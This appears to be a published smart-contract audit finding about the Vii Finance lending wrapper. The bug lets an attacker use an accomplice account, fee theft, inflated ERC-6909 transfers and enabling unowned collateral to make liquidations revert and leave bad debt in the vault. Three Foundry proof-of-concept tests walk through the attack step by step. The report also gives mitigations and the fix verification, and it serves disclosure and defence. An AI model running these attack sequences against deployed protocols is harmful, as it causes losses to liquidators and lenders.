---
tags:
  - lang/solidity
  - sector/governance
  - sector/lending
  - sector/oracle
  - sector/uncollat-lending
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/access-control/fake-account-substitution
  - vuln/logic/liquidation-logic
  - impact/loss-of-funds/fee-theft
  - impact/mev/frontrun
  - novelty/variant
  - misassumption/admin-is-honest
  - misassumption/math-is-safe
  - fix/add-access-control
  - fix/redesign-logic
protocol: "[[Vii]]"
auditors:
  - "[[Giovanni Di Siena]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-15-cyfrin-vii-v2.0.md"
genome:
  - "[[fake-account-substitution]]"
  - "[[liquidation-logic]]"
  - "[[fee-theft]]"
  - "[[frontrun]]"
  - "[[variant]]"
  - "[[access-roles]]"
  - "[[account-ownership]]"
  - "[[debt-accrual-update]]"
  - "[[dos-resistance]]"
  - "[[frontrun-exposure]]"
  - "[[integer-bounds]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
---
# Liquidations can be made to revert by an attacker through various means, causing losses to liquidators and bad debt to accrue in the vault

- id: 61327
- impact: HIGH
- protocol: [[Vii]]
- reporter: Giovanni Di Siena (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-15-cyfrin-vii-v2.0.md

## Summary


This bug report describes a vulnerability that allows an attacker to manipulate the liquidation process in a way that prevents their position from being liquidated. This is achieved by exploiting various issues, including fee theft and incorrect accounting, which can cause liquidation to revert or become disincentivized. The attacker can also use multiple malicious accounts to coordinate the attack. This can result in significant losses for the vault and accrual of bad debt. The report provides proof of concept tests that demonstrate how the attack can be carried out. 

## Details

**Description:** Coordination between two malicious accounts combined with various other attack vectors fully documented in separate findings can be leveraged by an attacker to engineer scenarios in which liquidators are disincentivised or otherwise unable to unwind liquidatable positions due to an inability to recover the underlying collateral to which they are entitled.

To summarise the issues that make this attack possible:
* Fee theft causes partial unwraps to revert for positions that were already partially unwrapped. The expectation is that partial liquidation will execute and liquidator will perform a partial unwrap to recover the underlying collateral; however, this will not be possible if the wrapper contract holds insufficient balance to process the proportional transfer.
* Incorrect accounting causes transfer amounts to become inflated for positions that were previously partially unwrapped. This can cause liquidation to revert as the violator will have insufficient ERC-6909 to complete the transfer.
* Enabling collateral for which the sender has no ERC-6909 balance can be similarly utilized to block successful transfer of other collateral assets against which the violator has borrowed vault assets.

Consider the following scenario:
* Alice and Bob are controlled by the same malicious user.
* Alice owns a position represented by `tokenId1` and Bob owns a position represented by `tokenId2`.
* Both `tokenId1` and `tokenId2` positions accrue some fees.
* Alice transfers a small portion of `tokenId1` to Bob.
* Bob performs a small partial unwrap of `tokenId1`.
* Both `tokenId1` and `tokenId2` positions accrue some more fees.
* Alice borrows the max debt and shortly after the position becomes liquidatable.
* Bob front-runs partial liquidation of `tokenId1` with full unwrap of `tokenId2` through partial unwrap (fee theft exploit).
* Partial liquidation succeeds, transferring a portion of `tokenId1` to the liquidator.
* Liquidator attempts to partially unwrap `tokenId1` to retrieve the underlying principal collateral plus fees but it reverts.
* This either causes a loss to the liquidator if executed in separate transactions or prevents/disincentivizes partial liquidation if executed atomically.
* The position continues to become undercollateralized until it is fully liquidatable.
* The transfer during liquidation will revert due to the transfer inflation issue calculating a transfer amount larger than Alice's balance.
* Alice's position is undercollateralized and bad debt accrues in the vault.
* Note: without the transfer issue, Alice's entire `tokenId1` balance is transferred to the liquidator, but still it is not possible to recover the underlying collateral even with full unwrap as the liquidator does not own the entire ERC-6909 supply (Bob still holds a small portion).

As demonstrated below, this complex series of steps can successfully block liquidations. The violator can partially unwrap one position, and with another position can steal the remaining fees, leaving wrapper contract without sufficient currency balance for the remaining pending fees of the partially unwrapped position. When partial liquidation occurs, even if the liquidator is unwrapping a small portion of the full position, there are no fees on the balance which will cause the liquidation to revert. This setup can in fact be drastically reduced by simply enabling collateral for which the sender has no ERC-6909 balance, blocking successful transfer of other collateral assets backing the debt without relying on the fee theft.

**Impact:** An attacker can deliberately cause DoS that prevents their position from being liquidated with high likelihood. This has significant impact for the vault which will accrue bad debt.

**Proof of Concept:** Referencing the diff provided in a separate issue which defines `increasePosition()`, run the following tests with `forge test --mt test_blockLiquidationsPoC -vvv`:

* This first PoC uses the enabling of unowned collateral and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_enableCollateral() public {
    address attacker = makeAddr("attacker");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. attacker wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);

    // 3. attacker enables both tokenId1 and tokenId2 as collateral
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. attacker max borrows from vault
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate attacker becoming liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));

    // @audit-issue => liquidator attempts to liquidate attacker
    // @audit-issue => but transfer reverts due to insufficient ERC-6909 balance of tokenId1
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);
}
```

* This second PoC uses the fee theft and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_transferInflation() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator attempts to liquidate attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // full liquidation reverts due to transfer inflation issue
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(attacker, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. at most 1% of the partially liquidated position can be unwrapped
    eVault.liquidate(attacker, address(wrapper), maxRepay / 10, 0);
    uint256 partialBalance = wrapper.balanceOf(liquidator, tokenId1) / 10;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        partialBalance,
        bytes("")
    );
}
```

* This third PoC demonstrates that it is still possible to cause losses to the liquidator using fee theft even after the transfer issue is fixed (apply the recommended mitigation diff to observe this test passing):

```solidity
function test_blockLiquidationsPoC_feeTheft() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator fully liquidates attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. liquidator repays the debt
    deal(token1, liquidator, 1_000_000_000 * unit1);
    IERC20(token1).approve(address(eVault), type(uint256).max);
    eVault.repay(type(uint256).max, liquidator);
    evc.disableCollateral(liquidator, address(wrapper));
    eVault.disableController();

    // 11. attempting to unwrap even 1% of the position fails
    uint256 balanceToUnwrap = wrapper.balanceOf(liquidator, tokenId1) / 100;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        balanceToUnwrap,
        bytes("")
    );

    // 12. full unwrap is blocked by accomplice's non-zero balance
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            liquidator,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator
    );
}
```

**Recommended Mitigation:** To mitigate this issue, the recommendations for all other issues should be applied:
* Decrement the `tokensOwed` state for a given ERC-6909 `tokenId` once the corresponding fees have been have been collected.
* Account for only the violator's `tokenId` balance when performing the `normalizedToFull()` calculation.
* Consider preventing collateral from being enabled when the sender does not hold any ERC-6909 balance of the `tokenId`.

**VII Finance:** Fixed in commits [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf) and [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a).

**Cyfrin:** Verified. The fee theft and inflated ERC-6909 transfers are no longer valid attack vectors. It is still possible to enable collateral without holding any ERC-6909 balance, but with the other mitigations applied this simply results in a zero value transfer as formally verified by the following Halmos test:

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
import {Test} from "forge-std/Test.sol";

contract MathTest is Test {
    // halmos --function test_mulDivPoC
    function test_mulDivPoC(uint256 amount, uint256 value) public {
        vm.assume(value != 0);
        assertEq(Math.mulDiv(amount, 0, value, Math.Rounding.Ceil), 0);
    }
}
```
